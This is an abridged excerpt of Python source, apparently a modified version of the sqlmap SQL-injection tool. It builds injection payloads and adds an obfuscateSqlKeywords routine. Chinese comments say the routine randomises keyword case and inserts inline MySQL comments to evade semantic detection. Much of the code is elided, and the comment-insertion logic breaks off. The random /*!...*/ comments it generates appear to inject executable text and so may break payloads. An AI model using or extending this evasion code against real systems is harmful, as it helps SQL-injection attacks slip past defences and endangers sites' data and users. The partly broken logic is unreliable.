...
class Agent(object):
    ...
    def payload(self, place=None, parameter=None, value=None, newValue=None, where=None):
        ...
        if value is None:
            _newValue = newValue or ""
            if where == PAYLOAD.WHERE.ORIGINAL:
                value = origValue
            elif where == PAYLOAD.WHERE.NEGATIVE:
                if conf.invalidLogical:
                    match = re.search(r"\A[^ ]+", _newValue)
                    newValue = _newValue[len(match.group() if match else ""):]
                    _ = randomInt(2)
            ...
            newValue = "%s%s" % (value, newValue if newValue is not None else _newValue)
    ...
    def cleanupPayload(self, payload, origValue=None):
        ...
        # =============================================================================
        # Phase 2: SQL 关键字随机化 - 去工程化（大小写变换、注释插入、编码混淆）
        # =============================================================================
        payload = self.obfuscateSqlKeywords(payload)

        return payload

    def obfuscateSqlKeywords(self, payload):
        """
        随机化 SQL 关键字以规避语义特征检测
        包括：大小写变换、随机注释插入、部分编码混淆
        """
        if not payload or not isinstance(payload, six.string_types):
            return payload

        # SQL 关键字列表
        sql_keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 
                        'INSERT', 'UPDATE', 'DELETE', 'JOIN', 'ORDER', 'GROUP',
                        'HAVING', 'LIMIT', 'OFFSET', 'CASE', 'WHEN', 'THEN',
                        'ELSE', 'END', 'IF', 'NULL', 'TRUE', 'FALSE', 'NOT',
                        'IN', 'EXISTS', 'BETWEEN', 'LIKE', 'CONCAT', 'COUNT',
                        'LENGTH', 'SUBSTRING', 'ASCII', 'ABS', 'ROUND']

        # 随机大小写变换函数
        def random_case(word):
            if random.random() < 0.3:  # 30% 概率进行大小写变换
                return ''.join(c.upper() if random.random() < 0.5 else c.lower() for c in word)
            return word

        # 随机生成内联注释
        def random_inline_comment():
            if random.random() < 0.2:  # 20% 概率插入注释
                comment_len = random.randint(1, 8)
                comment_body = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(comment_len))
                return "/*!%s*/" % comment_body
            return ""
        ...
        for keyword in sql_keywords:
            ...
            for match in reversed(matches):
                ...
                obfuscated = random_case(original)
                result = result[:start] + obfuscated + result[end:]

        # 2. 随机插入内联注释（在空格位置）
        if random.random() < 0.15:  # 15% 概率在关键字后插入注释
            for keyword in ['SELECT', 'FROM', 'WHERE', 'AND', 'OR']:
                pattern = r'(%s\s+)' % re.escape(keyword)
                replacement = r'\1/*!%s*/' % ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(2, 5)))
